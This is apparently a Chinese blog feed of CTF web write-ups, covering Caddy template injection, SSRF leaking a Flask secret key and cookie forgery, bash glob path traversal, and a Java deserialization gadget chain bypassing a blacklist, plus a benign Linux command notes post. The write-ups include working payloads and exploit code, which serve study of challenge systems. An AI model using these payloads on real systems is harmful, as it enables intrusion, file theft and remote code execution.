ua.caddy.chal-kalmarc.tf &#123;tls internaltemplatesimport html_reply `User-Agent: &#123;&#123;.Req.Header.Get  &quot;User-Agent&quot;&#125;&#125;`&#125;http.caddy.chal-kalmarc.tf &#123;tls internaltemplatesimport html_reply &quot;You are connected with &#123;http.request.proto&#125; (&#123;tls_version&#125;, &#123;tls_cipher&#125;).&quot;&#125;

发现User-Agent处有可能是存在模板注入的，所以我们去试验一下 &#123;&#123;7&#125;&#125;，会回显，但是输入其他的比如 &#123;&#123;7*7&#125;&#125;的时候会返回500，这时候便应该去查官方的相关文档（做题时完全没有意识到这点）：https://caddyserver.com/docs/modules/http.handlers.templates#docs
查看的时候会发现两个提别有意思的语句，如下：

这两个函数都可以呈现出文件中的内容，我们可以试验 readFlile &quot;/etc/passwd&quot;，回显内容

以上这个函数可以用来显示目录下面的文件，所以我们输入命令 &#123;&#123;listFiles "/"&#125;&#125;，根目录下文件显示出来，然后利用可以读取文件的那两个方法来读取flag文件，得到我们所需的flag
Is It Down该题是输入一个url后可以对该url进行一个check，是一个明显的ssrf，但是输入的网址要求必须是https开头，但是我们可以通过构造自己的https网址，从那里重定向到http网址去，相关的php代码如下：
&lt;?phpheader(&quot;Location: &quot;.$_GET[&#x27;x&#x27;]);?&gt;

由于是个明显的ssrf漏洞，我们尝试通过file伪协议来读取本地文件：https://ctf.hijwei.top/?wells=file:///etc/passwd，成功读取
我们可以用 /proc来进行读取相关内容，/proc是一个虚拟的文件系统，关于它的一些基础用法可以访问该网址：https://blog.csdn.net/cosmoslin/article/details/122660083
我们开始使用

可以看到响应的内容里面有个uwsgi，通过搜索可知这跟python起个服务有关，说明该题的后端语言是python，内容的后半部分是所属的配置文件，我们直接访问（由于做的题目都是docker里面起的服务，所以进程号都是1，self可以改为1）

然后我们可以进行顺藤摸瓜访问其后端文件

我们整理一下，变回flask的代码，如下：
from flask import Flask, request, send_from_directory, session, abortfrom requestlib import fetchfrom config import session_encryption_keyimport subprocessimport osdef protect_secrets():    os.unlink(&quot;config.py&quot;)def check_url(url):    if not isinstance(url, str) or len(url) == 0:        return False, &quot;Please provide a regular url!&quot;    if not url.startswith(&quot;https://&quot;) or url.lstrip() != url:        return False, &quot;Url must start with &#x27;https://&#x27;. We do not want anything insecure here!&quot;    return True, &quot;&quot;app = Flask(__name__, static_folder=&#x27;static&#x27;, static_url_path=&#x27;/assets/&#x27;)app.secret_key = session_encryption_keyprint(&quot;Using key:&quot;, app.secret_key)protect_secrets()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def home():    return send_from_directory(&#x27;pages&#x27;, &#x27;index.html&#x27;)@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True:        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)@app.route(&#x27;/check&#x27;, methods=[&#x27;POST&#x27;])def check():    url = request.form.get(&quot;url&quot;)    valid, err = check_url(url)    if not valid:        return &#123;            &#x27;success&#x27;: False,            &#x27;error&#x27;: err        &#125;    if True:        content = fetch(url)        return &#123;            &#x27;success&#x27;: True,            &#x27;online&#x27;: content != None,            &#x27;content&#x27;: content        &#125;if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;, port=10600, debug=False)

其中最引人瞩目的便是下面这块子路由为 /flag的代码
@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;])def healthcheck():    if session.get(&quot;admin&quot;) == True:        return subprocess.check_output(&quot;/readflag&quot;)    else:        return abort(403)

需要 /flag 访问 admin 设置 True ，这意味着我们需要泄漏 session_encryption_key 值，但是仔细看代码会发现代码在这之前会执行一个函数将 config.py文件删除掉，导致我们的方法不会成功，题解中告诉我们在Python工作目录下，如果执行某文件后经常会自动生成一个__pycache__文件夹，就是python的缓存文件夹
举个例子，如果执行的是python ./demo.py，就会生成demo.cpython-39.pyc文件，后面的39是python版本号并去掉了小数点，该题的python 版本号是3.11（可以通过前面抓包访问的配置文件回显的内容发现），题解告诉了我们这种文件存储的路径是 /var/www/keep-dreaming-sonny-boy/__pycache__/config.cpython-311.pyc，所以我们开始尝试

回显了一大串16进制的数据，我们将它转化为2进制的数据，这是逆向工程，以下脚本可以帮助到你
data_str =&quot;\\xa7\\r\\r\\n\\x00\\x00\\x00\\x00\\x86\\x84\\xf7e;\\x00\\x00\\x00\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xf3\\n\\x00\\x00\\x00\\x97\\x00d\\x00Z\\x00d\\x01S\\x00)\\x02\\xda Rm7GbQJ4uDikyiis6miD7YwsN11rEjfLN)\\x01\\xda\\x16session_encryption_key\\xa9\\x00\\xf3\\x00\\x00\\x00\\x00\\xfa*/var/www/keep-dreaming-sonny-boy/config.py\\xfa\\x08&lt;module&gt;r\\x07\\x00\\x00\\x00\\x01\\x00\\x00\\x00s\\x11\\x00\\x00\\x00\\xf0\\x03\\x01\\x01\\x01\\xd8\\x19;\\xd0\\x00\\x16\\xd0\\x00\\x16\\xd0\\x00\\x16r\\x05\\x00\\x00\\x00&quot;#将字符串里面的转义序列转化为相应的二进制数据binary_data = bytes(data_str, &quot;utf-8&quot;).decode(&quot;unicode_escape&quot;).encode(&quot;latin1&quot;)#保存到文件中with open(&quot;output_binary_data.txt&quot;, &quot;wb&quot;) as file:    file.write(binary_data)print(&quot;Success&quot;)

将文件后缀名命名为 .pyc，然后上网找个在线pyc文件反编译的网站用一下，得到以下结果：
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information# Version : Python 3.11session_encryption_key = &#x27;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&#x27;

然后使用工具伪造一个属于我们自己的cookie，这边用的是 Flask Unsign，可以在github上面安装，命令如下：
$ pip3 install flask-unsign[wordlist]

伪造cookie：
flask-unsign --sign --cookie &quot;&#123;&#x27;admin&#x27;: True&#125;&quot; --secret &quot;Rm7GbQJ4uDikyiis6miD7YwsN11rEjfL&quot;

将得到的session复制到cookie处，然后访问 /flag，得到flag
BadAss Server for Hypertext先用bp抓个包，尝试一下目录穿越，发现成功了

利用 /proc来进行尝试，查看cmdline目录获取启动指定进程的完整命令

访问 /../../../../../../app/badass_server.sh，获得如下代码：
#!/bin/bash# I hope there are no bugs in this source code...set -edeclare -A request_headersdeclare -A response_headersdeclare methoddeclare urideclare protocoldeclare request_bodydeclare status=&quot;200 OK&quot;abort() &#123;	declare -gA response_headers	status=&quot;400 Bad Request&quot;	write_headers	if [ ! -z $&#123;1+x&#125; ]; then		&gt;&amp;2 echo &quot;Request aborted: $1&quot;		echo -en $1	fi	exit 1&#125;write_headers() &#123;	response_headers[&#x27;Connection&#x27;]=&#x27;close&#x27;	response_headers[&#x27;X-Powered-By&#x27;]=&#x27;Bash&#x27;	echo -en &quot;HTTP/1.0 $status\r\n&quot;	for key in &quot;$&#123;!response_headers[@]&#125;&quot;; do		echo -en &quot;$&#123;key&#125;: $&#123;response_headers[$key]&#125;\r\n&quot;	done	echo -en &#x27;\r\n&#x27;	&gt;&amp;2 echo &quot;$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;) $SOCAT_PEERADDR $method $uri $protocol -&gt; $status&quot;&#125;receive_request() &#123;	read -d $&#x27;\n&#x27; -a request_line	if [ $&#123;#request_line[@]&#125; != 3 ]; then		abort &quot;Invalid request line&quot;	fi	method=$&#123;request_line[0]&#125;	uri=$&#123;request_line[1]&#125;	protocol=$(echo -n &quot;$&#123;request_line[2]&#125;&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)	if [[ ! $method =~ ^(GET|HEAD)$ ]]; then		abort &quot;Invalid request method&quot;	fi	if [[ ! $uri =~ ^/ ]]; then		abort &#x27;Invalid URI&#x27;	fi	if [ $protocol != &#x27;HTTP/1.0&#x27; ] &amp;&amp; [ $protocol != &#x27;HTTP/1.1&#x27; ]; then		abort &#x27;Invalid protocol&#x27;	fi	while read -d $&#x27;\n&#x27; header; do		stripped_header=$(echo -n &quot;$header&quot; | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;)		if [ -z &quot;$stripped_header&quot; ]; then			break;		fi		header_name=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 1 | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27; | tr &#x27;[:upper:]&#x27; &#x27;[:lower:]&#x27;);		header_value=$(echo -n &quot;$header&quot; | cut -d &#x27;:&#x27; -f 2- | sed &#x27;s/^\s*//g&#x27; | sed &#x27;s/\s*$//g&#x27;);		if [ -z &quot;$header_name&quot; ] || [[ &quot;$header_name&quot; =~ [[:space:]] ]]; then			abort &quot;Invalid header name&quot;;		fi		# If header already exists, add value to comma separated list		if [[ -v request_headers[$header_name] ]]; then			request_headers[$header_name]=&quot;$&#123;request_headers[$header_name]&#125;, $header_value&quot;		else			request_headers[$header_name]=&quot;$header_value&quot;		fi	done	body_length=$&#123;request_headers[&quot;content-length&quot;]:-0&#125;	if [[ ! $body_length =~ ^[0-9]+$ ]]; then		abort &quot;Invalid Content-Length&quot;	fi	read -N $body_length request_body&#125;handle_request() &#123;	# Default: serve from static directory	path=&quot;/app/static$uri&quot;	path_last_character=$(echo -n &quot;$path&quot; | tail -c 1)	if [ &quot;$path_last_character&quot; == &#x27;/&#x27; ]; then		path=&quot;$&#123;path&#125;index.html&quot;	fi	if ! cat &quot;$path&quot; &gt; /dev/null; then		status=&quot;404 Not Found&quot;	else		mime_type=$(file --mime-type -b &quot;$path&quot;)		file_size=$(stat --printf=&quot;%s&quot; &quot;$path&quot;)		response_headers[&quot;Content-Type&quot;]=&quot;$mime_type&quot;		response_headers[&quot;Content-Length&quot;]=&quot;$file_size&quot;	fi	write_headers	cat &quot;$path&quot; 2&gt;&amp;1&#125;receive_requesthandle_request

我注意到以下逻辑：
1if  [  $protocol  !=  &#x27;HTTP/1.0&#x27;  ]  &amp;&amp;  [  $protocol  !=  &#x27;HTTP/1.1&#x27;  ];  then abort &#x27;Invalid protocol&#x27;  fi

This has some unquoted variables and may allow us to glob the $protocol value. I tried a basic test:这有一些未加引号的变量，可能允许我们对 $protocol 值进行全球化。我尝试了一个基本测试：
通配它应该只产生一个结果，我们得到了 Invalid Protocol ，所以我接下来尝试：
这应该产生&gt; 1 个结果（如果前面的文件是不存在的话，这次服务器的输出是错误的 cat）。测试一个应该产生 0 结果的也会给出 Invalid Protocol 了。这意味着我们有一个预言机，我们可以检测目录中是否有&gt; 1 个文件。我们想泄露包含该标志的隐藏目录（大概）。我决定最好使用正则表达式方法。我们必须创建一个与已知文件夹之一（通过查看页面源码可以确定一个已知文件名）完全匹配的正则表达式，然后我们可以暴力破解值以找到隐藏的文件夹（这样 glob 将返回 2 个文件并给我们那个 cat 错误或其他的)！工作原理如下：
/assets/f200d055a267ae56160198e0fcb47e5f/try_harder.tx /app/static/assets/[^fabcde1345678][^123457890abc][^abe][^abcdef124][^abcde1][^abcdef0134][^abdef012347][^012345678abcde][^103456789abcd][^abcdef013][^abcde01234567][^a-f0123456][^a-f0234][^b-f012345678][^ab][^678][^a][^a-f0][^134567890abcdef][^b-f01][^abdef1234567890][^a][^abcdef12340678][^b-f1][^01234568][^a-f01234][^abdef0123][^1234567890abcef][^a][^ac][^a-f02345][^a-f02345]*

最后我们可以找到隐藏的目录 9df5256fe48859c91122cb92964dbd66 ，并且可以找到位于 /assets/9df5256fe48859c91122cb92964dbd66/flag.txt中的flag
]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>Linux命令笔记</title>
    <url>/2024/01/24/Linux%E5%91%BD%E4%BB%A4%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[省流版echo:打印你给的参数
echo $PATH：输出电脑上的目录
which 参数:会输出运行参数的路径（比如：which echo）
pwd:当前工作目录
cd：改变当前工作目录（例子：cd /home）
.：表示当前目录；..：表示上一级目录
给出被调用运行的程序的绝对路径：程序可以直接运行起来
ls：列出当前目录下的文件
~：带你回到用户目录（在cd命令下面使用）
cd -：将当前目录跳转到你所处的上一个目录
–help：会告诉你这个命令怎么用（ls --help）
mv:重命名文件，接受两个路径，先是原有的，然后是新的；也可以把文件移到不同的目录
mv dotfiles.md foo.md

cp：复制文件，两个路径（复制源路径和目标路径，都要是完整路径，但不必是同一个目录）
cp dotfile.md ../food.md

rm：移除一个文件，不能是目录
rmdir：只允许移除空目录
mkdir：创建一个新目录
Ctrl+l：清空终端，让光标回到顶部
&lt;:重定向这个程序的输入流
大于号：重定向这个程序的输入流
echo hello &gt; hello.txt：把hello输入hello.txt文件中去

cat:打印一个文件的内容（cat也支持输入流和输出流）
cat &lt; hello.txt意思是把hello.txt里面的内容作为cat的输入，把这些内容输出到终端cat &lt; hello.txt &gt;hello2.txthello.txt里面的内容作为cat的输入，把这些内容存到hello2.txt文件中

&gt;&gt;：追加而不是覆写
cat &lt;hello.txt &gt;&gt;hello2.txt当hello2.txt文件中已经有hello时会再加上一个hello

|：去左侧程序的输出做右边程序的输入
tail:打印出输入的最后n行
ls -l / | tail -n1打印最后一行的内容

sudo+平常的命令：会以root的身份运行这个命令
sudo su：接下来以root运行接下来的命令
文件权限位包括读取（read）、写入（write）和执行（execute）权限。

读取权限（r）允许用户查看文件内容和属性。
写入权限（w）允许用户修改文件内容和属性。
执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。

每个文件都有三组权限位，分别对应文件的所有者、用户组和其他用户。
精致版前置知识1.目录符号/ 表示从 根目录
~表示从 家目录(即&#x2F;home&#x2F;用户名，root用户为/root)
. 代表当前目录
.. 代表上一级目录
2.绝对目录与相对目录相对路径 在输入路径时，使用.或者..，表示相对 当前目录 所在的目录位置
绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置，特点：需要写入完整地址
3.&gt; 和 &gt;&gt;重定向 命令功能：将命令执行结果重定向到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中
&gt; 表示输出，会覆盖文件原有的内容
&gt;&gt; 表示追加，会将内容追加到已有文件的末尾
4.|管道符
Linux 允许将 一个命令的输出 可以通过管道| 做为 另一个命令的输入
这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）

pwd 命令对应单词：print working directory
功能：打印当前工作目录
ls 命令对应单词：list
功能：列出目录的内容或者使用通配符列出文件名匹配的文件
格式:
SHELLls [参数]

可选参数



-a
显示指定目录下所有目录与文件，包括隐藏文件



-l
以列表方式显示文件的详细信息


-h
配合 -l 以人性化的方式显示文件大小


注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
find 命令对应单词：find
功能：指定目录及其子目录下查找文件和目录
格式
PLAINTEXTfind [路径] [匹配条件] [动作]

常用的匹配条件：



可选匹配条件
作用



-name
按文件名查找，支持使用通配符 * 和 ?


-type
按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。


-size[+-]
按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。


-mtime
按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。


-user
按文件所有者查找。


-group
按文件所属组查找。


cd 命令对应单词：change directory
功能：更改当前的工作目录
格式:
SHELLcd 目录

cd搭配符号



命令
含义



cd &#x2F;cd ~
切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)


cd .
保持在当前目录不变


cd ..
切换到上级目录


cd –
可以在最近两次工作目录之间来回切换


touch命令功能：

如果文件不存在，可以创建一个空白文件
如果文件已经存在，可以修改文件的末次修改日期

mkdir命令对应单词：make directory
功能：创建一个新的目录



选项
含义



-p
创建多级目录 需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）


注意：新建目录的名称 不能与当前目录中 已有的目录同名
rm命令对应单词：remove
功能：删除文件或目录



可选参数
含义



-f
强制删除，忽略不存在的文件，无需提示


-r
递归地删除目录下的内容，删除文件夹时必须加此参数


cp命令对应单词：copy
功能：复制文件或者目录



可选参数
含义



-i
覆盖文件前提示


-r
若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名


mv命令对应单词：move
功能：移动文件或者目录／文件或者目录重命名



可选参数
含义



-i
覆盖文件前提示


cat命令对应单词： concatenate
功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件



可选参数
含义



-b
对非空输出行编号


-n
对输出的所有行编号


more命令对应单词： more
功能： 分屏显示文件内容
使用 more 的操作键：



操作键
功能



空格键
显示手册页的下一屏


Enter
键 一次滚动手册页的一行


b
回滚一屏


f
前滚一屏


q
退出


&#x2F;word
搜索 word 字符串


echo命令对应单词： more
功能： 在终端中显示参数指定的文字，通常会和重定向联合使用
进程命令ps命令：英文： process status
作用：显示当前正在运行的进程的快照。



命令
作用



ps aux
查看进程的详细状况


ps -ef
显示所有进程的完整信息


ps 进程代号
显示特定进程代号的详细信息


top



kill [-9] 进程代号
终止指定代号的进程， -9 表示强行终止


ps 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明



选项
含义



a
显示终端上的所有进程，包括其他用户的进程


u
显示进程的详细状态


x
显示没有控制终端的进程


top命令：作用： 动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序
输入 q退出 top 命令界面
kill命令：作用： 向进程发送信号以终止或操作进程
常见用法



命令
作用



kill 进程代号
向指定进程代号的进程发送默认的终止信号


kill -9 进程代号
向指定进程代号的进程发送强制终止信号


提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃
pgrep命令：作用： 向进程发送信号以终止或操作进程
PLAINTEXTpgrep [选项] &lt;进程名称&gt;

其中，&lt;进程名称&gt; 是要匹配的进程名称或模式。可以使用通配符进行模糊匹配。



可选选项
说明



-u &lt;用户名&gt;
根据用户名过滤进程。


-n
仅返回最新的匹配进程的进程 ID。


-x
精确匹配进程名称，不进行模糊匹配。


-d &lt;分隔符&gt;
指定输出的分隔符，默认为换行符。


]]></content>
  </entry>
  <entry>
    <title>L3HCTF-2025web题解</title>
    <url>/2025/07/17/L3HCTF-2025web%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[best_profile首先我们先分析nginx.conf的代码
http &#123;    include mime.types;    default_type text/html;    access_log off;    error_log /dev/null;    sendfile on;    keepalive_timeout 65;    proxy_cache_path /cache levels=1:2 keys_zone=static:20m inactive=24h max_size=100m;    server &#123;        listen 80 default_server;        location / &#123;            proxy_pass http://127.0.0.1:5000;        &#125;        location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ &#123;            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;            proxy_pass http://127.0.0.1:5000;            proxy_cache static;            proxy_cache_valid 200 302 30d;        &#125;        location ~ .*\.(js|css)?$ &#123;            proxy_ignore_headers Cache-Control Expires Vary Set-Cookie;            proxy_pass http://127.0.0.1:5000;            proxy_cache static;            proxy_cache_valid 200 302 12h;        &#125;    &#125;&#125;

主要的就是对静态资源（图片、JS、CSS）进行缓存处理，成功缓存的时间为30天
看静态文件last_ip.html中存在ssti注入的点
&lt;body&gt;    &lt;div class=&quot;header&quot;&gt;        &lt;h1&gt;Facebook&lt;/h1&gt;        &lt;a href=&quot;/profile&quot;&gt;Profile&lt;/a&gt;    &lt;/div&gt;    &lt;div class=&quot;content-container&quot;&gt;        &lt;h2&gt;Last Login IP&lt;/h2&gt;        &lt;p&gt;&#123;&#123; last_ip &#125;&#125;&lt;/p&gt;    &lt;/div&gt;&lt;/body&gt;

到app.py中看哪块代码渲染了改静态文件
@app.route(&quot;/get_last_ip/&lt;string:username&gt;&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def route_check_ip(username):    if not current_user.is_authenticated:        return &quot;You need to login first.&quot;    user = User.query.filter_by(username=username).first()    if not user:        return &quot;User not found.&quot;    return render_template(&quot;last_ip.html&quot;, last_ip=user.last_ip)@app.route(&quot;/ip_detail/&lt;string:username&gt;&quot;, methods=[&quot;GET&quot;])def route_ip_detail(username):    res = requests.get(f&quot;http://127.0.0.1/get_last_ip/&#123;username&#125;&quot;)    if res.status_code != 200:        return &quot;Get last ip failed.&quot;    last_ip = res.text    try:        ip = re.findall(r&quot;\d+\.\d+\.\d+\.\d+&quot;, last_ip)        country = geoip2_reader.country(ip)    except (ValueError, TypeError):        country = &quot;Unknown&quot;    template = f&quot;&quot;&quot;    &lt;h1&gt;IP Detail&lt;/h1&gt;    &lt;div&gt;&#123;last_ip&#125;&lt;/div&gt;    &lt;p&gt;Country:&#123;country&#125;&lt;/p&gt;    &quot;&quot;&quot;    return render_template_string(template)

可以知道是通过route_check_ip方法来渲染last_ip.html，然后再route_ip_detail方法中获取，并通过render_template_string方法来进行渲染
而render_template_string方法由于是直接渲染输入的字符串内容，因而存在安全隐患
这里有一个重要的细节：

route_ip_detail 使用 requests.get() 发送请求到 http://127.0.0.1/get_last_ip/&#123;username&#125;
这是一个全新的 HTTP 请求，与当前用户的会话完全独立
这个新请求不会携带原有的用户认证信息

所以即使用户已经登录：

当直接访问 /get_last_ip/&lt;username&gt; 时会正常显示 last_ip
但通过 /ip_detail/&lt;username&gt; 访问时会返回 “You need to login first”

这是因为：

用户的登录状态存储在会话（session）中
requests.get() 创建了新的 HTTP 请求，没有携带原有的会话信息
所以 /get_last_ip/&lt;username&gt; 接口会认为这是一个未登录的请求

然后我们看注册登录处并没有限制账号名，也就是说我们可以通过账号名设为.jpg等后缀来实现成功缓存，然后在 requests.get() 访问的时候便可以获取到已经缓存的静态文件内容了
而last_ip的值我们可以通过修改请求头X-Forwarded-For来获取
首先我们先进行注册

登录

把登录获取到的session进行复制，访问get_last_ip路由

可以看到获取到的last_ip值就是我们输入进去的内容，别急，这还没经过render_template_string方法的渲染
接下来拿着这个session继续访问ip_detail路由

渲染成功，证明确实是存在ssti
剩下的步骤就是套payload进去就是了
ssti没有做限制，但是由于经过了⼀层html转义，引号等符号可能无法使用，需要⼀些其他 payload
还要注意的是由于在nginx.conf文件中设置了静态文件的缓存时间为30天，所以每次在X-Forwarded-For标头换payload的时候都要重新注册并登录账号
TellMeWhy?首先粗略地过一下项目目录，发现有一个比较重要的MyFilter文件

对访问baby路由下的任何路径都会进行处理，我们跟进ctx.realIp()看下realIp是怎么获取的

继续跟进，发现是通过下面这个方法获取到的
public String getRealIp(Context ctx) &#123;    String ip = ctx.header(&quot;X-Real-IP&quot;);    if (Utils.isEmpty(ip) || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = ctx.headerOrDefault(&quot;X-Forwarded-For&quot;, &quot;&quot;);        if (ip.contains(&quot;,&quot;)) &#123;            ip = ip.split(&quot;,&quot;)[0];        &#125;    &#125;    if (Utils.isEmpty(ip) || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = ctx.remoteIp();    &#125;    return ip;&#125;

实际上就是控制 X-Real-Ip 头或者 xff 头，这里判断的 条件是本身不为 127.0.0.1 但是 dns 解析后是 127.0.0.1，有一大堆，这里拿个 localhost 加在任意一个请求头上就绕过了
访问baby&#x2F;why路由，其代码在HomeController中
@Mapping(&quot;/baby/why&quot;)@Postpublic String why(Map map, Context ctx) throws Exception &#123;    if (map.containsKey((Object)null)) &#123;        return &quot;躺阴沟！think more！&quot;;    &#125; else &#123;        System.out.println(&quot;map: &quot; + map);        System.out.println(map.size());        System.out.println(&quot;ctx.body(): &quot; + ctx.body());        JSONObject jsonObject = new JSONObject(ctx.body());        System.out.println(jsonObject.length());        if (map.size() != jsonObject.length() &amp;&amp; jsonObject.has(&quot;why&quot;) &amp;&amp; jsonObject.length() &lt; 8300) &#123;            String why = jsonObject.getString(&quot;why&quot;);            byte[] decode = Base64.getDecoder().decode(why);            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(decode);            MyInputObjectStream myInputObjectStream = new MyInputObjectStream(byteArrayInputStream);            TangYingGouModel tyg = (TangYingGouModel)myInputObjectStream.readObject();            myInputObjectStream.close();            String yourName = tyg.getYour_name();            return &quot;MVP！MVP！MVP！&quot; + yourName;        &#125; else &#123;            return &quot;摘一朵花，送给妈妈，妈妈！&quot;;        &#125;    &#125;&#125;

这里就非常的阴间了，这里需要通过json的解析差异来进行绕过map.size() != jsonObject.length()判断
鄙人在不断的调试过程中始终没找到map是怎么put进去的，所以就直接开始看JSONOject的初始化去了

首先我们先普通地传个json数据进去
&#123;&quot;why&quot;:&quot;111&quot;,&quot;why1&quot;:&quot;222&quot;,&quot;why2&quot;:&quot;333&quot;&#125;

然后直接跟进JSONObject jsonObject = new JSONObject(ctx.body());，跟到如下所示

便是在该方法中对传入的json数据进行处理，具体过程这里就不写了，但一直调试下去的时候我们会发现处理是在什么时候结束的
在每处理完一对键值对之后，都会对接下来的字符进行判断

是一个switch从句，其中一个case是当下一个字符是&#125;的时候，会直接返回
ok，这就是我们所需要的点了，也就是说我们只需要在传入的json数据中插入一个&#125;，那么就会直接在那里结束对json数据的处理，而不会继续处理下面的键值对，从而造成了map与jsonObject之间的长度不同，成功进入if从句
&#123;&quot;why&quot;:&quot;111&quot;,&quot;why1&quot;:&quot;222&quot;,&#125;&quot;why2&quot;:&quot;333&quot;&#125;


里面是用题目自己写的MyInputObjectStream类对输入流进行一个反序列化，在这里面存在一个黑名单
String[] blacklist = new String[]&#123;&quot;javax.management.BadAttributeValueExpException&quot;, &quot;javax.swing.event.EventListenerList&quot;, &quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;&#125;;

这里我们采用XString来绕过对BadAttributeValueExpException和EventListenerList的限制
（详见https://cina666.github.io/2025/02/13/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bfastjson/）
题目的fatjson2和java版本都比较高，无法利用Idap来打
题目给的MyObject和MyProxy也不会用，知道动态代理但不知道具体要怎么操作
比赛结束后开看学长的wp，给了一篇很有意思的文章：https://cn-sec.com/archives/3620965.html#google_vignette
里面就有关于利用动态代理绕过高版本fastjson的部分

看到三层动态代理，spring-aop链，想起了我之前写过一篇文章来分析yso中关于spring的链子，就是三层动态代理
damn！！！当时看到getObject方法的时候怎么没反应过来。。。
（如果不是很理解链子的三层动态代理的可见文章：https://xz.aliyun.com/news/17923）
那么剩下的要做的就是稍微修改一下作者的poc了，将原poc中的badAttribute链换成 XString 的链，然后把 MyProxy 和 MyObject 保 持原包结构，在题目里把代码 copy 过来，再把原本是 ObjectFactoryDelegatingInvocationHandler 的地方换成 MyProxy，原本是 ObjectFactory 的地方换成 MyObject 就行 

下面就只贴对Fastjson4_ObjectFactoryDelegatingInvocationHandler修改后的内容
import com.sun.org.apache.xpath.internal.objects.XString;import common.Reflections;import common.Util;import gadgets.*;import org.example.demo.Utils.MyObject;import org.example.demo.Utils.MyProxy;import org.springframework.beans.factory.ObjectFactory;import javax.xml.transform.Templates;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.util.HashMap;import java.util.Map;public class Fastjson4_ObjectFactoryDelegatingInvocationHandler &#123;    public Object getObject (String cmd) throws Exception &#123;        Object node1 = TemplatesImplNode.makeGadget(cmd);        Map map = new HashMap();        map.put(&quot;object&quot;,node1);        Object node2 = JSONObjectNode.makeGadget(2,map);        Proxy proxy1 = (Proxy) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(),                new Class[]&#123;MyObject.class&#125;, (InvocationHandler)node2);//        Object node3 = ObjectFactoryDelegatingInvocationHandlerNode.makeGadget(proxy1);        Object node3 = Reflections.newInstance(&quot;org.example.demo.Utils.MyProxy&quot;,                MyObject.class,proxy1);        Proxy proxy2 = (Proxy) Proxy.newProxyInstance(Proxy.class.getClassLoader(),                new Class[]&#123;Templates.class&#125;, (InvocationHandler)node3);        Object node4 = JsonArrayNode.makeGadget(2,proxy2);        Object node5 = getXString(node4);        Object[] array = new Object[]&#123;node1,node5&#125;;        Object node6 = HashMapNode.makeGadget(array);        return node6;    &#125;    public static HashMap getXString(Object obj) throws Exception&#123;        //obj传入待触发toString()的，可根据实际情况把XString换了，用来接任意equals        XString xstring=new XString(&quot;&quot;);        HashMap hashMap1 = new HashMap();        HashMap hashMap2 = new HashMap();        hashMap1.put(&quot;zZ&quot;,obj);        hashMap1.put(&quot;yy&quot;,xstring);        hashMap2.put(&quot;zZ&quot;,xstring);        hashMap2.put(&quot;yy&quot;,obj);        HashMap hashMap = new HashMap();        hashMap.put(&quot;hashMap1&quot;, 1);        hashMap.put(&quot;hashMap2&quot;, 2);        setHashMapKey(hashMap,&quot;hashMap1&quot;,hashMap1);//避免提前触发抛异常导致程序无法继续进行        setHashMapKey(hashMap,&quot;hashMap2&quot;,hashMap2);        return hashMap;    &#125;    public static  void setHashMapKey(HashMap hashMap,Object oldKey,Object newKey) throws Exception&#123;        Field tableField = HashMap.class.getDeclaredField(&quot;table&quot;);        tableField.setAccessible(true);        Object[] table = (Object[]) tableField.get(hashMap);        for (Object entry: table)&#123;            // System.out.println(entry);            if (entry!= null)&#123;                Field keyField = entry.getClass().getDeclaredField(&quot;key&quot;);                keyField.setAccessible(true);                Object keyValue = keyField.get(entry);                if (keyValue.equals(oldKey))                    setField(entry,&quot;key&quot;,newKey);            &#125;        &#125;    &#125;    public static void setField(Object object,String fieldName,Object value) throws Exception&#123;        Class&lt;?&gt; c = object.getClass();        Field field;        try &#123;            field = c.getDeclaredField(fieldName);        &#125;catch (Exception e)&#123;            field = c.getSuperclass().getDeclaredField(fieldName);        &#125;        field.setAccessible(true);        field.set(object,value);    &#125;  